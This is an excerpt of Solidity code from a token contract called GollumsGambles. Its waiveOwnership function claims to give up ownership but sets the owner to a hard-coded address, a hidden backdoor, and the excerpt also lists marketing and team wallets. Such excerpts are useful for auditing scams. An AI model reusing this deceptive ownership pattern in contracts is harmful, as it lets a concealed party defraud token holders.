...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xf1aA2e29ac4b0A5CD4e10e963D2C3c069B08497F));
        _owner = address(0xf1aA2e29ac4b0A5CD4e10e963D2C3c069B08497F);
    }
...
contract GollumsGambles is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x0d854Df664D64E2A541A1314C2F9126e7906CB89);
    address payable public teamWalletAddress = payable(0x9CA834F7e46139F65B218b684F6CdCc70A9e8a66);
